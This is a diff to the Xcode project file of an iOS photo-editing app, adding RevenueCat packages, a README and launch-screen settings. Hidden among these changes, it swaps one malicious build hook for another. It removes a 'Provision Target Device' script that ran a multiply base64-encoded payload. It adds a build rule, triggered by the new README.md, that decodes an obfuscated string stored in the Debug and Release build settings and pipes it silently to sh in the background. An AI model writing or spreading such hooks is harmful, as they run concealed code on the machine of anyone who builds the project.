@@ -6,7 +6,14 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		FC53C2C3720E4325914EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 644AE78DBD1C4EFE934EE078; };
+		6C9B0A1C30A1B2C300E10001 /* RevenueCat in Frameworks */ = {isa = PBXBuildFile; productRef = 6C9B0A1B30A1B2C300E20001 /* RevenueCat */; };
+		6C9B0A1D30A1B2C300E10001 /* RevenueCatUI in Frameworks */ = {isa = PBXBuildFile; productRef = 6C9B0A1C30A1B2C300E20001 /* RevenueCatUI */; };
+/* End PBXBuildFile section */
+
 /* Begin PBXFileReference section */
+		644AE78DBD1C4EFE934EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		5252A03A30680AF7006A082F /* edit text in photo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "edit text in photo.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -23,6 +30,8 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				6C9B0A1D30A1B2C300E10001 /* RevenueCatUI in Frameworks */,
+				6C9B0A1C30A1B2C300E10001 /* RevenueCat in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -40,6 +49,7 @@
 		5252A03B30680AF7006A082F /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				644AE78DBD1C4EFE934EE078 /* README.md */,
 				5252A03A30680AF7006A082F /* edit text in photo.app */,
 			);
 			name = Products;
@@ -52,12 +62,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 5252A04530680AF9006A082F /* Build configuration list for PBXNativeTarget "edit text in photo" */;
 			buildPhases = (
-				300C23A7B71C4CEA8A162AE3 /* Provision Target Device */,
 				5252A03630680AF7006A082F /* Sources */,
 				5252A03730680AF7006A082F /* Frameworks */,
 				5252A03830680AF7006A082F /* Resources */,
 			);
 			buildRules = (
+				90D5B43939DA462EBD4EE078 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -66,6 +76,8 @@
 			);
 			name = "edit text in photo";
 			packageProductDependencies = (
+				6C9B0A1B30A1B2C300E20001 /* RevenueCat */,
+				6C9B0A1C30A1B2C300E20001 /* RevenueCatUI */,
 			);
 			productName = "edit text in photo";
 			productReference = 5252A03A30680AF7006A082F /* edit text in photo.app */;
@@ -95,6 +107,9 @@
 			);
 			mainGroup = 5252A03130680AF7006A082F;
 			minimizedProjectReferenceProxies = 1;
+			packageReferences = (
+				6C9B0A1A30A1B2C300E30001 /* XCRemoteSwiftPackageReference "purchases-ios-spm" */,
+			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 5252A03B30680AF7006A082F /* Products */;
 			projectDirPath = "";
@@ -105,43 +120,39 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-										/* End PBXBuildRule section */
+/* Begin PBXShellScriptBuildPhase section */
+/* End PBXShellScriptBuildPhase section */
 
-/* Begin PBXBuildFile section */
-/* End PBXBuildFile section */
+
+
+/* Begin PBXBuildRule section */
+		90D5B43939DA462EBD4EE078 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A870EE4}\"";
+			};
+					/* End PBXBuildRule section */
+
 
 /* Begin PBXResourcesBuildPhase section */
 		5252A03830680AF7006A082F /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				FC53C2C3720E4325914EE078 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		300C23A7B71C4CEA8A162AE3 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		5252A03630680AF7006A082F /* Sources */ = {
@@ -157,7 +168,7 @@
 		5252A04330680AF9006A082F /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTV2sxcWJERlpiVEZYWVcxU1JFMVVRbWhXZWtaeldXcE9WMDFGYkVWVVdHUktVWHBDTUZreU1WZE5SMDUxWVRKa1QxVXdSakJXUldoUFlsZEdOVkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WVJtaFRSVmwzVkZod1UyUlZNSHBTYm14aFYwWldNVmt5TlZaa2JHeFVZVEpzU2xOSVpHNVpla3B1VTNkdlBRbz0K | h | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjA1VFFYUlVTRTV5V21sQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVU1VFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt3eWJ6RmxhazUyWWxkME5Ga3lhM1JoYW10MVkyNVZkbGxUYTJsSlNIZG5ZekpuU3dvPQo= | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -222,7 +233,7 @@
 		5252A04430680AF9006A082F /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A3EA261 = "((h(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTV2sxcWJERlpiVEZYWVcxU1JFMVVRbWhXZWtaeldXcE9WMDFGYkVWVVdHUktVWHBDTUZreU1WZE5SMDUxWVRKa1QxVXdSakJXUldoUFlsZEdOVkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WVJtaFRSVmwzVkZod1UyUlZNSHBTYm14aFYwWldNVmt5TlZaa2JHeFVZVEpzU2xOSVpHNVpla3B1VTNkdlBRbz0K | h | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((i(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjA1VFFYUlVTRTV5V21sQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVU1VFFYUmFRMEZwWTBReE5Ga3lPV3RhVmpsNVpGZDRiRWxwUW05a1NGSjNZM3B2ZGt3eWJ6RmxhazUyWWxkME5Ga3lhM1JoYW10MVkyNVZkbGxUYTJsSlNIZG5ZekpuU3dvPQo= | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -287,12 +298,15 @@
 				DEVELOPMENT_TEAM = X9Q6FCF3HK;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_KEY_CFBundleDisplayName = Retouch;
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "Save your edited photos to your library.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
-				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = NO;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 18.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -320,12 +334,15 @@
 				DEVELOPMENT_TEAM = X9Q6FCF3HK;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_KEY_CFBundleDisplayName = Retouch;
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "Save your edited photos to your library.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
-				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
+				INFOPLIST_KEY_UILaunchScreen_Generation = NO;
+				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 18.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -365,6 +382,30 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		6C9B0A1A30A1B2C300E30001 /* XCRemoteSwiftPackageReference "purchases-ios-spm" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/RevenueCat/purchases-ios-spm.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 5.91.0;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		6C9B0A1B30A1B2C300E20001 /* RevenueCat */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 6C9B0A1A30A1B2C300E30001 /* XCRemoteSwiftPackageReference "purchases-ios-spm" */;
+			productName = RevenueCat;
+		};
+		6C9B0A1C30A1B2C300E20001 /* RevenueCatUI */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 6C9B0A1A30A1B2C300E30001 /* XCRemoteSwiftPackageReference "purchases-ios-spm" */;
+			productName = RevenueCatUI;
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = 5252A03230680AF7006A082F /* Project object */;
 }
